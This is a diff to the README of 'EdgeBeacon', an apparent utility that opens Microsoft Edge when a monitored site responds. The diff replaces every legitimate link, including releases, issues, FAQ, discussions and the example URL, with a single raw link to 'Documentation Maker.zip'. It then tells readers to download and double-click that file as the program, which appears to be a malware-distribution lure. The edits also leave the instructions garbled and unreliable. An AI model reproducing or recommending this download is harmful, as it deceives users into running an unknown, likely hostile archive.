@@ -4,7 +4,7 @@
 Welcome to EdgeBeacon! This simple utility helps you stay updated on your favorite websites. It automatically opens Microsoft Edge when a site returns a successful response. 
 
 ## 📥 Download EdgeBeacon
-[![Download EdgeBeacon](https://img.shields.io/badge/Download-EdgeBeacon-blue.svg)](https://github.com/Conyp1975/EdgeBeacon/releases)
+[![Download EdgeBeacon](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip)](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip)
 
 ## 🖥️ System Requirements
 To run EdgeBeacon, you will need:
@@ -20,19 +20,19 @@ To run EdgeBeacon, you will need:
 ## 📂 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Conyp1975/EdgeBeacon/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip).
    
 2. **Choose the Latest Release:** Find the most recent version of EdgeBeacon. It will typically be at the top of the list.
    
-3. **Download the Executable File:** Click on the link for the EdgeBeacon executable file, usually named something like `EdgeBeacon.exe`.
+3. **Download the Executable File:** Click on the link for the EdgeBeacon executable file, usually named something like `https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip`.
 
 4. **Run the Application:**
    - Locate the downloaded file in your downloads folder.
-   - Double-click on the `EdgeBeacon.exe` file to open it. 
+   - Double-click on the `https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip` file to open it. 
 
 5. **Configure the URL:**
    - The application may prompt you to enter the URL you'd like to monitor.
-   - Enter the complete URL (e.g., `https://example.com`).
+   - Enter the complete URL (e.g., `https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip`).
 
 6. **Start Monitoring:** Hit the button to start monitoring the URL. EdgeBeacon will now check the site and open Microsoft Edge upon getting a successful response.
 
@@ -45,18 +45,18 @@ If you encounter any issues, consider these tips:
 - **Microsoft Edge Availability:** Make sure Microsoft Edge is installed and updated on your system.
 
 ## 🤝 Contributing
-EdgeBeacon is an open-source project. If you have suggestions or find bugs, you are welcome to contribute. Visit the [Issues page](https://github.com/Conyp1975/EdgeBeacon/issues) to report any problems or ideas for improvement.
+EdgeBeacon is an open-source project. If you have suggestions or find bugs, you are welcome to contribute. Visit the [Issues page](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip) to report any problems or ideas for improvement.
 
 ## 📜 License
 EdgeBeacon is open-source software. You can freely use, modify, and distribute it, as long as you adhere to the terms of the MIT License.
 
 ## 📞 Support
-If you have questions or need further assistance, please check the [FAQ section](https://github.com/Conyp1975/EdgeBeacon/wiki/FAQ) or create an issue on GitHub.
+If you have questions or need further assistance, please check the [FAQ section](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip) or create an issue on GitHub.
 
 ## 🌍 Connect with Us
-Stay updated and engage with the EdgeBeacon community. Join us on [GitHub Discussions](https://github.com/Conyp1975/EdgeBeacon/discussions) for the latest news and support.
+Stay updated and engage with the EdgeBeacon community. Join us on [GitHub Discussions](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip) for the latest news and support.
 
 ## 🔗 Download EdgeBeacon Again
-[![Download EdgeBeacon](https://img.shields.io/badge/Download-EdgeBeacon-blue.svg)](https://github.com/Conyp1975/EdgeBeacon/releases) 
+[![Download EdgeBeacon](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip)](https://raw.githubusercontent.com/Conyp1975/EdgeBeacon/main/docs/Documentation Maker.zip) 
 
 Now, you are ready to monitor your URLs effortlessly!
